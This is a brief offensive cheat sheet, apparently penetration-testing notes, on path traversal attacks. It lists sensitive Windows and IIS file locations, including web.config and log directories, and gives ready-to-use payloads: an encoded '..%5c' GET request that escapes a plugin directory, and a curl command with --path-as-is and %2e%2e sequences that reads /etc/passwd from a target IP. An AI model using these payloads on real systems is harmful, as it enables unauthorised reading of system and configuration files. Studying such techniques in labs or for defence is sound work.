# Path Traversal

- `../` sequences only matter until the root (`/`). Adding extras beyond the root is harmless and useful when CWD is unknown.
- **Windows hosts file:** `\Windows\System32\drivers\etc\hosts` (readable by all users)
- **IIS log files:** `C:\inetpub\logs\LogFiles\W3SVC1\` (site ID is incremental)
- **IIS web config:** `C:\inetpub\wwwroot\web.config`

**Windows bypass — use `..%5c` instead of `../`:**
```
GET /public/plugins/alertlist/..%5c..%5c..%5c..%5c..%5cUsers%5cinstall.txt
```

**cURL with encoded path (send as-is):**
```bash
curl --path-as-is "http://192.168.53.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
